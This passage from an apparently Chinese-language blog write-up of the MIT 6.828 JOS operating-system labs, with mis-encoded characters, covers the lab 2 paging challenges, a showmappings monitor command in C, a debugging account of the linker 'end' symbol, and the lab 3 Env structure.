¸è™šæ‹Ÿåœ°å€ç©ºé—´ä¹‹å‰çš„æ­£å¸¸è¿è¡Œ</p></li></ol></blockquote><p>æ¥ä¸‹æ¥æ˜¯é€‰åšéƒ¨åˆ†ï¼šMIT 6.828 çš„ Challenge</p><blockquote><p><em>Challenge!</em> We consumed many physical pages to hold the page tables for the KERNBASE mapping. Do a more space-efficient job using the PTE_PS (â€œPage Sizeâ€) bit in the page directory entries. This bit was <em>not</em> supported in the original 80386, but is supported on more recent x86 processors. You will therefore have to refer to <a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/IA32-3A.pdf">Volume 3 of the current Intel manuals</a>. Make sure you design the kernel to use this optimization only on processors that support it!</p></blockquote><p>è¿™ä¸ª challenge çš„æ„æ€å¤§æ¦‚å°±æ˜¯å¼€å¯ 4MB çš„å¤§é¡µï¼Œè¿™é¦–å…ˆéœ€è¦æˆ‘ä»¬ä¿®æ”¹ Cr4 å¯„å­˜å™¨ï¼Œè®¾ç½® <strong>Page-Size Extensions</strong> æ ‡å¿—ä½ä¸º 1 åå†…å­˜é¡µçš„å¤§å°å°±ä» 4KB å˜æˆäº† 4MBï¼Œè¿˜éœ€è¦è®¾ç½®é¡µè¡¨é¡¹çš„ <code>PTE_PS</code> ä½ï¼Œä¸»è¦éƒ½æ˜¯è‹¦åŠ›æ´»è¿™é‡Œå°±å…ˆæ‘¸äº†ï¼ˆ</p><p>ä¸‹ä¸€ä¸ª Challengeï¼Œæ–°å¢ä¸€ä¸ª <code>showmappings</code> å‘½ä»¤ï¼š</p><blockquote><p><em>Challenge!</em> Extend the JOS kernel monitor with commands to:</p><ul><li>Display in a useful and easy-to-read format all of the physical page mappings (or lack thereof) that apply to a particular range of virtual/linear addresses in the currently active address space. For example, you might enter <code>'showmappings 0x3000 0x5000'</code> to display the physical page mappings and corresponding permission bits that apply to the pages at virtual addresses 0x3000, 0x4000, and 0x5000.</li><li>Explicitly set, clear, or change the permissions of any mapping in the current address space.</li><li>Dump the contents of a range of memory given either a virtual or physical address range. Be sure the dump code behaves correctly when the range extends across page boundaries!</li><li>Do anything else that you think might be useful later for debugging the kernel. (Thereâ€™s a good chance it will be!)</li></ul></blockquote><p>ä½¿ç”¨ strtol å°†å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—åä½¿ç”¨ <code>page_lookup()</code> æŸ¥é˜…é¡µè¡¨åæ‰“å°å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_show_mapping</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-type">uintptr_t</span> vstart, vend;<br><span class="hljs-type">pte_t</span>*pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span>;</span><br><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>)<br>&#123;<br>cprintf(<span class="hljs-string">&quot;Usage: showmappings addr_start addr_end\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>vstart = strtol(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>vend = strtol(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (vstart &gt; vend)<br>&#123;<br>cprintf(<span class="hljs-string">&quot;Invalid start or end address!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>cprintf(<span class="hljs-string">&quot;Virtual address\t\tPhysical Address\n&quot;</span>);<br><span class="hljs-keyword">for</span> (; vstart &lt;= vend; vstart += PGSIZE)<br>&#123;<br>cprintf(<span class="hljs-string">&quot;  %010p\t\t &quot;</span>, vstart);<br>pp = page_lookup(kern_pgdir, (<span class="hljs-type">void</span>*) vstart, &amp;pte);<br><span class="hljs-keyword">if</span> (!pte)<br>cprintf(<span class="hljs-string">&quot; Not mapped yet.\n&quot;</span>);<br><span class="hljs-keyword">else</span><br>cprintf(<span class="hljs-string">&quot;  %010p\n&quot;</span>, page2pa(pp));<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/03/16/Zz7vt2aeMJlUGVD.png" alt="image.png"></p><h3 id="Address-Space-Layout-Alternatives">Address Space Layout Alternatives</h3><p>å½“å‰çš„ JOS å†…å­˜å¸ƒå±€å¹¶éæ˜¯å”¯ä¸€çš„ä¸€ç§ï¼Œä¸€ä¸ªæ“ä½œç³»ç»Ÿè¿˜èƒ½å°†å†…æ ¸æ˜ å°„åœ¨çº¿æ€§ä½åœ°å€ç©ºé—´ã€è€Œå°†çº¿æ€§é«˜åœ°å€ç©ºé—´ç»™ç”¨æˆ·è¿›ç¨‹ä½¿ç”¨ï¼Œä½†ç”±äº x86çš„ä¸€ç§å‘åå…¼å®¹æ¨¡å¼â€”â€”è™šæ‹Ÿ 8086 æ¨¡å¼å°†å¤„ç†å™¨â€œç¡¬è¿çº¿â€åˆ°çº¿æ€§åœ°å€ç©ºé—´åº•éƒ¨ï¼Œå› æ­¤è‹¥å†…æ ¸æ˜ å°„åˆ°æ­¤å¤„åˆ™å®Œå…¨ä¸å¯ç”¨</p><p>è™½ç„¶è¿™å¯èƒ½æ¯”æƒ³è±¡ä¸­å›°éš¾ï¼Œä½†æˆ‘ä»¬ä»ç„¶æœ‰èƒ½å°†å†…æ ¸æ˜ å°„åˆ°ä½çº¿æ€§åœ°å€ç©ºé—´çš„æ–¹æ¡ˆâ€”â€”å…è®¸ç”¨æˆ·è¿›ç¨‹ç›´æ¥è®¿é—®æ•´ä¸ªåœ°å€ç©ºé—´ï¼Œä½†ä»å°†å†…æ ¸ä¸å„è¿›ç¨‹é—´åˆ†å‰²å¼€æ¥</p><blockquote><p>ç¬”è€…è¯„ä»·ï¼šé—²å¾—æ…Œ</p></blockquote><p>ä¸‹é¢æ˜¯ä¸‰ä¸ª<s>é—²å¾—æ…Œ</s>çš„ Challengeï¼š</p><blockquote><p><em>Challenge!</em> Each user-level environment maps the kernel. Change JOS so that the kernel has its own page table and so that a user-level environment runs with a minimal number of kernel pages mapped. That is, each user-level environment maps just enough pages mapped so that the user-level environment can enter and leave the kernel correctly. You also have to come up with a plan for the kernel to read/write arguments to system calls.</p></blockquote><p>å¤§æ¦‚æ˜¯ç»™å†…æ ¸è®¾ç½®ä¸€ä¸ªç‹¬ç«‹çš„é¡µè¡¨ï¼Œè€Œ<strong>ç”¨æˆ·è¿›ç¨‹ä»…ä¿ç•™å¿…é¡»ç”¨åˆ°çš„å†…æ ¸æ˜ å°„ï¼Œä¾‹å¦‚å†…æ ¸å…¥å£ç‚¹</strong>ï¼ˆæ¯”å¦‚è¯´ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼Œç¬”è€…è®¤ä¸ºè¿™ä¸ªå®ç°å·®ä¸å¤šæ˜¯ KPTI çš„æ€æƒ³ï¼Œè¿™é‡Œå°±ä¸æ‰‹æŠ„ä¸€ä»½ KPTI äº†~~ï¼Œç”¨æˆ·è¿›ç¨‹è¿˜å•¥å½±å­éƒ½æ²¡æœ‰ï¼Œå†™ä¸ªğŸ“~~</p><blockquote><p><em>Challenge!</em> Write up an outline of how a kernel could be designed to allow user environments unrestricted use of the full 4GB virtual and linear address space. Hint: do the previous challenge exercise first, which reduces the kernel to a few mappings in a user environment. Hint: the technique is sometimes known as â€œ<em>follow the bouncing kernel</em>.â€ In your design, be sure to address exactly what has to happen when the processor transitions between kernel and user modes, and how the kernel would accomplish such transitions. Also describe how the kernel would access physical memory and I/O devices in this scheme, and how the kernel would access a user environmentâ€™s virtual address space during system calls and the like. Finally, think about and describe the advantages and disadvantages of such a scheme in terms of flexibility, performance, kernel complexity, and other factors you can think of.</p></blockquote><p>å¤§æ¦‚æ˜¯è®¾è®¡ä¸å®ç°ä¸Šé¢çš„æ–¹æ¡ˆï¼Œå¹¶ç¡®ä¿è‡ªå·±æ˜ç¡®å…¶ä¸­çš„ç»†èŠ‚</p><blockquote><p><em>Challenge!</em> Since our JOS kernelâ€™s memory management system only allocates and frees memory on page granularity, we do not have anything comparable to a general-purpose <code>malloc</code>/<code>free</code> facility that we can use within the kernel. This could be a problem if we want to support certain types of I/O devices that require <em>physically contiguous</em> buffers larger than 4KB in size, or if we want user-level environments, and not just the kernel, to be able to allocate and map 4MB <em>superpages</em> for maximum processor efficiency. (See the earlier challenge problem about PTE_PS.)</p><p>Generalize the kernelâ€™s memory allocation system to support pages of a variety of power-of-two allocation unit sizes from 4KB up to some reasonable maximum of your choice. Be sure you have some way to divide larger allocation units into smaller ones on demand, and to coalesce multiple small allocation units back into larger units when possible. Think about the issues that might arise in such a system.</p></blockquote><p>å®Œå–„å†…æ ¸å†…å­˜ç®¡ç†ç³»ç»Ÿï¼Œæä¾›æ›´å¤§ç²’åº¦ä¸æ›´å°ç²’åº¦çš„ allocatorï¼ˆæ¯”å¦‚è¯´ buddy system + slub allocatorï¼‰ï¼Œè¿™é‡Œå°±ä¸æ‰‹æŠ„ä¸€ä»½ buddy system å’Œ slub allocator äº†ï¼Œç¬”è€…æš‚æ—¶ä¹Ÿæ²¡æœ‰æ›´å¥½çš„å†…å­˜åˆ†é…æ–¹æ¡ˆ</p><blockquote><p><s>ğŸ‘´æ˜¯æ‡’ğŸ•ğŸ‘´è‡ªè±ª</s></p></blockquote><p>è‡³æ­¤ï¼Œlab2 å…¨éƒ¨å®Œæˆ</p><h1>0x03.Lab 3: User Environments</h1><p>åœ¨è¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬ç»ˆäºè¦è¿ˆå…¥ç”¨æˆ·è¿›ç¨‹çš„ä¸–ç•Œï¼Œå®ç°ç‰¹æƒçº§çš„åˆ†ç¦»ï¼Œå¹¶å®Œæˆç³»ç»Ÿè°ƒç”¨çš„ç¼–å†™ä»¥åŠä¸€ä¸ªç”¨æˆ·è¿›ç¨‹çš„è¿è¡Œ</p><p><strong>æ³¨æ„</strong>ï¼šæœ¬ lab ä¸­ <code>environment</code> ä¸ <code>process</code> ä»£æŒ‡åŒä¸€äº‹ç‰©â€”â€”è¿è¡Œçš„è¿›ç¨‹çš„æŠ½è±¡ä½“ï¼Œ6.828 åœ¨è¿™é‡Œæ›´å¤šä½¿ç”¨ environment è€Œä¸æ˜¯ process æ˜¯ä¸ºäº†æŒ‡å‡º JOS environment ä¸ UNIX process æä¾›äº†ä¸åŒçš„æ¥å£ï¼Œä¸”ä¸æä¾›ç›¸åŒçš„è¯­ä¹‰</p><p>é¦–å…ˆæ˜¯æƒ¯ä¾‹åœ°å°† lab 3ä»£ç æ‹‰åˆ°æœ¬åœ°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&#x27;changes to lab2 after handin&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab2</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œç¬”è€…æœ¬æƒ³å…ˆè·‘ä¸€è·‘å†…æ ¸ç©ç©ï¼Œä½†æ˜¯é‡åˆ°ä¸€ä¸ªå¥‡æ€ªçš„é—®é¢˜ï¼šåœ¨åˆ†é…é¡µç›®å½•è¡¨åœ°å€ç©ºé—´åã€å»ºç«‹æ˜ å°„æ—¶ä¼š panic æ‰ï¼Œç»ç¬”è€…è°ƒè¯•å‘ç°åœ¨ boot_alloc() ä¸­åˆå§‹åŒ– nextfree çš„å€¼æ‰€æŒ‡å‘çš„é‚£å¼ å†…å­˜é¡µä¸Š<strong>ä»ç„¶å­˜åœ¨ç€ä¸€äº›å†…æ ¸å˜é‡ï¼Œå³è¿™å¹¶éæ˜¯ä¸€ä¸ªé—²ç½®çš„å†…å­˜é¡µ</strong>ï¼Œäºæ˜¯æˆ‘ä»¬çš„æŒ‡å‘é¡µç›®å½•è¡¨çš„æŒ‡é’ˆå°±è¢« memset æ¸…é›¶äº†â€¦</p><p>ä¸ºä»€ä¹ˆï¼Ÿè®©æˆ‘ä»¬å°†ç›®å…‰æ”¾å› <code>boot_alloc()</code> å‡½æ•°ä¸­ï¼Œåœ¨æˆ‘ä»¬åˆå§‹åŒ– nextfree æ—¶ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªå¤–éƒ¨å¼•å…¥çš„å˜é‡ <code>end</code> å¯¹å†…å­˜é¡µè¿›è¡Œå‘ä¸Šå¯¹é½å¾—åˆ°çš„åœ°å€ï¼Œè¿™é‡Œè¯´æ˜¯ç”±é“¾æ¥å™¨ç”Ÿæˆçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Initialize nextfree if this is the first time.</span><br><span class="hljs-comment">// &#x27;end&#x27; is a magic symbol automatically generated by the linker,</span><br><span class="hljs-comment">// which points to the end of the kernel&#x27;s bss segment:</span><br><span class="hljs-comment">// the first virtual address that the linker did *not* assign</span><br><span class="hljs-comment">// to any kernel code or global variables.</span><br><span class="hljs-keyword">if</span> (!nextfree) &#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> end[];<br>nextfree = ROUNDUP((<span class="hljs-type">char</span> *) end, PGSIZE);<br>&#125;<br></code></pre></td></tr></table></figure><p>**ä½†ç»è¿‡ç¬”è€…åç¼–è¯‘å†…æ ¸æ–‡ä»¶ã€æ‰“å° end å˜é‡ä¿¡æ¯å‘ç°ï¼Œå…¶å¹¶ä¸æŒ‡å‘ bss çš„æœ«å°¾ï¼Œåé¢è¿˜æœ‰å‡ ä¸ªå˜é‡ï¼Œä¸”å…¶åˆšå¥½è½åœ¨å†…å­˜é¡µå¯¹é½çš„åœ°å€â€¦**è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ ROUNDUP ä¸èƒ½é¡ºåˆ©æ‹¯æ•‘ nextfree çš„åŸå› ï¼Œå¯èƒ½ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¹‹å‰æ²¡æœ‰å‡ºç°è¯¥é—®é¢˜çš„åŸå› ï¼šä¹‹å‰ end ä¸ä¸€å®šåˆšå¥½è½åœ¨å†…å­˜é¡µå¯¹é½çš„åœ°å€ï¼Œå‘ä¸Šå¯¹é½ä¸€ä¸ªé¡µè‡ªç„¶å°±æ—©å·²è¶…å‡º bss äº†ï¼Œä½†æ˜¯ç°åœ¨é“¾æ¥å™¨æ°å¥½å°†å…¶ç”Ÿæˆåœ¨äº†ä¸€ä¸ªå¾®å¦™çš„ä½ç½®</p><p><img src="https://s2.loli.net/2022/03/16/FzLf8Z39beEkXrH.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/16/1YAmcNrF8h3iLTy.png" alt="image.png"></p><p>ç¬”è€…ç”šè‡³æ€€ç–‘ end å¯èƒ½ä¹‹å‰ç”šè‡³éƒ½ä¸åœ¨ bss æ®µæœ«å°¾ï¼Œå¯èƒ½ä¹Ÿä¸æ˜¯é“¾æ¥å™¨ç”Ÿæˆçš„â€œæœ«å°¾å˜é‡â€â€¦ä½†æ˜¯ä¸€çœ‹ IDA çš„åç¼–è¯‘ç»“æœï¼Œ<strong>å¥½åƒç¡®ä¹æœ‰ä¸ª end åœ¨æ•´ä¸ªé•œåƒçš„æœ€æœ«å°¾ï¼Œä½†ä»–åˆæŒ‡å›äº†é‚£ä¸ªä½ç½®å°´å°¬çš„ end å˜é‡</strong></p><p><img src="https://s2.loli.net/2022/03/16/qDMFGo9v83PAOpY.png" alt="image.png"></p><p>ç¬”è€…æš‚ä¸”ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´äº†è¿™ä¸ªç°è±¡çš„å‘ç”Ÿï¼Œç›®å‰çš„è§£å†³æ–¹æ¡ˆæ˜¯åœ¨è®¡ç®— nextfree æ—¶å¤šåŠ ä¸€ä¸ª page è¿›è¡Œ ROUNDUPï¼Œ<strong>ä½†åœ¨åé¢çš„ check_kern_pgdir é‡Œé¢åˆ panic æ‰äº†â€¦</strong></p><blockquote><p>lab2 è·‘å¾—å¥½å¥½çš„ lab3 å’‹çªç„¶è«åå…¶å¦™ç‚¸äº†ï¼ŒğŸ‘´ä¸ç†è§£</p></blockquote><p>äºæ˜¯ç¬”è€…<strong>å°† lab2 åˆ†æ”¯çš„ kern/pmap.c æ‹·è´è¿‡æ¥ï¼Œè®© end åŠ ä¸Šä¸€ä¸ª pageï¼Œå†…å­˜ç®¡ç†è¿™ä¸€å—åˆä¸€åˆ‡æ­£å¸¸äº†â€¦</strong></p><blockquote><p>ğŸ‘´æ„¿æ„ç§°ä¹‹ä¸ºçµå¼‚äº‹ä»¶</p></blockquote><p>é‚£å°±åªèƒ½æ˜¯ lab3 ä¸­çš„ä¸€äº›æ”¹åŠ¨æŠŠå†…å­˜ç®¡ç†ç»™ crash æ‰äº†ï¼Œç¬”è€…æ£€ç´¢è¯¥å‡½æ•°çš„ panic ä¿¡æ¯ï¼Œå‘ç°ç¡®ä¹æ˜¯åœ¨æ£€æŸ¥ lab3 æ–°å¢çš„å†…å­˜æ˜ å°„åŒºåŸŸæ—¶ panic çš„ï¼ˆè¿™å—å†…å­˜æˆ‘ä»¬è¿˜æ²¡æ˜ å°„ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// check envs array (new test for lab 3)</span><br>n = ROUNDUP(NENV*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env), PGSIZE);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i += PGSIZE)<br>assert(check_va2pa(pgdir, UENVS + i) == PADDR(envs) + i);<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æ¥ä¸‹æ¥é‡æ–°å¼€å§‹ lab3 çš„æ—…ç¨‹</p><blockquote><p>ä½†ğŸ‘´è§‰å¾— end ç¡®ä¹æ˜¯å¯¹é½é”™äº†</p></blockquote></blockquote><p>åœ¨ lab3 ä¸­æ–°å¢äº†ä»¥ä¸‹æ–‡ä»¶ï¼š</p><table><thead><tr><th><code>inc/</code></th><th><code>env.h</code></th><th>Public definitions for user-mode environments</th></tr></thead><tbody><tr><td></td><td><code>trap.h</code></td><td>Public definitions for trap handling</td></tr><tr><td></td><td><code>syscall.h</code></td><td>Public definitions for system calls from user environments to the kernel</td></tr><tr><td></td><td><code>lib.h</code></td><td>Public definitions for the user-mode support library</td></tr><tr><td><code>kern/</code></td><td><code>env.h</code></td><td>Kernel-private definitions for user-mode environments</td></tr><tr><td></td><td><code>env.c</code></td><td>Kernel code implementing user-mode environments</td></tr><tr><td></td><td><code>trap.h</code></td><td>Kernel-private trap handling definitions</td></tr><tr><td></td><td><code>trap.c</code></td><td>Trap handling code</td></tr><tr><td></td><td><code>trapentry.S</code></td><td>Assembly-language trap handler entry-points</td></tr><tr><td></td><td><code>syscall.h</code></td><td>Kernel-private definitions for system call handling</td></tr><tr><td></td><td><code>syscall.c</code></td><td>System call implementation code</td></tr><tr><td><code>lib/</code></td><td><code>Makefrag</code></td><td>Makefile fragment to build user-mode library, <code>obj/lib/libjos.a</code></td></tr><tr><td></td><td><code>entry.S</code></td><td>Assembly-language entry-point for user environments</td></tr><tr><td></td><td><code>libmain.c</code></td><td>User-mode library setup code called from <code>entry.S</code></td></tr><tr><td></td><td><code>syscall.c</code></td><td>User-mode system call stub functions</td></tr><tr><td></td><td><code>console.c</code></td><td>User-mode implementations of <code>putchar</code> and <code>getchar</code>, providing console I/O</td></tr><tr><td></td><td><code>exit.c</code></td><td>User-mode implementation of <code>exit</code></td></tr><tr><td></td><td><code>panic.c</code></td><td>User-mode implementation of <code>panic</code></td></tr><tr><td><code>user/</code></td><td><code>*</code></td><td>Various test programs to check kernel lab 3 code</td></tr></tbody></table><h2 id="Part-A-User-Environments-and-Exception-Handling">Part A: User Environments and Exception Handling</h2><p>åœ¨æ–°åŠ å…¥çš„å¤´æ–‡ä»¶ <code>inc/env.h</code> ä¸­åŒ…å«äº† JOS çš„åŸºæœ¬çš„ç”¨æˆ·ç¯å¢ƒå®šä¹‰ï¼Œå†…æ ¸ä½¿ç”¨ç»“æ„ä½“ <code>Env</code> æ¥æ ‡è¯†æ¯ä¸€ä¸ªç”¨æˆ·ç¯å¢ƒï¼Œåœ¨æœ¬ lab ä¸­æˆ‘ä»¬éœ€è¦å®Œæˆ JOS çš„å¤šç¯å¢ƒæ”¯æŒ</p><p>åœ¨ <code>kern/env.c</code> ä¸­ï¼Œå†…æ ¸ç»´æŠ¤ä¸‰ä¸ªä¸ç¯å¢ƒæœ‰å…³çš„å…¨å±€å˜é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">envs</span> =</span> <span class="hljs-literal">NULL</span>;<span class="hljs-comment">// All environments</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">curenv</span> =</span> <span class="hljs-literal">NULL</span>;<span class="hljs-comment">// The current env</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">env_free_list</span>;</span><span class="hljs-comment">// Free environment list</span><br></code></pre></td></tr></table></figure><p>åœ¨ JOS å¯åŠ¨æ—¶ä¼šåˆå§‹åŒ–ä¸€ä¸ªé•¿åº¦ä¸º <code>NENV</code> çš„ <code>Env</code> ç»“æ„ä½“æ•°ç»„ï¼Œå…¶ä¸­é—²ç½®çš„ Env ç»“æ„ä½“é“¾åœ¨ <code>env_free_list</code> ä¸­ï¼Œè€Œ <code>curenv</code> æŒ‡å‘å½“å‰ç¯å¢ƒçš„ Env ç»“æ„ä½“ï¼ˆç±»ä¼¼äº Linux å†…æ ¸ä¸­çš„ current() æŒ‡å‘ å½“å‰ CPU ä¸Šè¿è¡Œçš„è¿›ç¨‹çš„ task_structï¼‰ï¼Œåœ¨å¯åŠ¨é˜¶æ®µ curenv ä¸º NULL</p><blockquote><p>ç¬”è€…è®¤ä¸ºè¿˜æ˜¯å«è¿›ç¨‹å¥½å¬ï¼Œæ—¢ç„¶æ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œæ²¡æœ‰å¿…è¦ä¸ºäº†å’Œ UNIX åŒºåˆ†å¼€æ¥è€Œç‰¹æ„æ”¹ä¸ªè«åå…¶å¦™çš„åå­—</p></blockquote><h3 id="Environment-State">Environment State</h3><p><code>Env</code> ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼Œç¬”è€…è®¤ä¸ºå¯ä»¥ç±»æ¯”åš Linux ä¸‹çš„ <code>task_struct</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Trapframe</span> <span class="hljs-title">env_tf</span>;</span><span class="hljs-comment">// Saved registers</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">env_link</span>;</span><span class="hljs-comment">// Next free Env</span><br><span class="hljs-type">envid_t</span> env_id;<span class="hljs-comment">// Unique environment identifier</span><br><span class="hljs-type">envid_t</span> env_parent_id;<span class="hljs-comment">// env_id of this env&#x27;s parent</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">EnvType</span> <span class="hljs-title">env_type</span>;</span><span class="hljs-comment">// Indicates special system environments</span><br><span class="hljs-type">unsigned</span> env_status;<span class="hljs-comment">// Status of the environment</span><br><span class="hljs-type">uint32_t</span> env_runs;<span class="hljs-comment">// Number of times environment has run</span><br><br><span class="hljs-comment">// Address space</span><br><span class="hljs-type">pde_t</span> *env_pgdir;<span class="hljs-comment">// Kernel virtual address of page dir</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å„å­—æ®µè¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><p><strong>env_tf</strong>: è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­çš„å¯„å­˜å™¨çŠ¶æ€</p></li><li><p><strong>env_link</strong>: åœ¨ <code>env_free_list</code> é“¾è¡¨ä¸­æŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—² Env ç»“æ„ä½“</p></li><li><p><strong>env_id</strong>: å”¯ä¸€æ ‡è¯†å•ä¸ªè¿›ç¨‹çš„ idï¼Œåœ¨ Env ç»“æ„ä½“è¢«é‡æ–°åˆ†é…åé€šå¸¸ä¼šå‘ç”Ÿæ”¹å˜</p></li><li><p><strong>env_parent_id</strong>: çˆ¶è¿›ç¨‹çš„ id</p></li><li><p><strong>env_type</strong>: è¿›ç¨‹ç±»å‹ï¼Œå¯¹äºå¤§éƒ¨åˆ†è¿›ç¨‹è€Œè¨€åº”å½“ä¸º <code>ENV_TYPE_USER</code> åœ¨åç»­çš„ lab ä¸­ä¼šè¡¥å……æ›´å¤šçš„ä¸ºç³»ç»ŸæœåŠ¡è€Œå‡ºç°çš„ç±»å‹</p></li></ul><blockquote><p>ç”¨æˆ·è¿›ç¨‹ä¸å†…æ ¸è¿›ç¨‹çš„æ—¢è§†æ„Ÿ</p></blockquote><ul><li><p><strong>env_status</strong>: è¿›ç¨‹çŠ¶æ€ï¼Œå¯é€‰å€¼èŒƒå›´å¦‚ä¸‹ï¼š</p><ul><li><p><code>ENV_FREE</code>: è¯¥ Env ç»“æ„ä½“ç©ºé—²</p></li><li><p><code>ENV_RUNNABLE</code>: è¯¥ Env ç»“æ„ä½“å¯¹åº”ç€ä¸€ä¸ªç­‰å¾…è¿è¡Œçš„è¿›ç¨‹</p></li><li><p><code>ENV_RUNNING</code>: è¯¥ Env ç»“æ„ä½“å¯¹åº”ç€ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</p></li><li><p><code>ENV_NOT_RUNNABLE</code>: è¯¥ Env ç»“æ„ä½“å¯¹åº”è¿›ç¨‹æœªå‡†å¤‡å¥½ç»§ç»­è¿è¡Œï¼ˆä¾‹å¦‚åœ¨ç­‰å¾…å¦ä¸€ä¸ªè¿›ç¨‹çš„ä¿¡å·ï¼‰</p></li><li><p><code>ENV_DYING</code>: è¯¥ Env ç»“æ„ä½“å¯¹åº”ä¸€ä¸ªåƒµå°¸è¿›ç¨‹ï¼Œæˆ‘ä»¬å°†åœ¨ lab4 ä¸­ç”¨åˆ°å®ƒ</p></li></ul></li><li><p><strong>env_pgdir</strong>: è¿›ç¨‹é¡µç›®å½•è¡¨</p></li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒJOS ä¸­çš„è¿›ç¨‹å¹¶æ²¡æœ‰è‡ªå·±çš„å†…æ ¸æ ˆï¼ŒåŒä¸€æ—¶åˆ»å†…åªæœ‰ä¸€ä¸ªè¿›ç¨‹å¯ä»¥å¤„åœ¨å†…æ ¸æ€ï¼Œæ‰€ä»¥ JOS åªéœ€è¦ä¸€ä¸ªå•ç‹¬çš„å†…æ ¸æ ˆ</p><h3 id="Allocating-the-Environments-Array">Allocating the Environments Array</h3><p>é¦–å…ˆæ˜¯ä¸€ä¸ªå°ç»ƒä¹ ï¼Œåœ¨ <code>mem_init()</code> ä¸­ä¸º envs æ•°ç»„åˆ†é…ç©ºé—´</p><blockquote><p><strong>Exercise 1.</strong> Modify <code>mem_init()</code> in 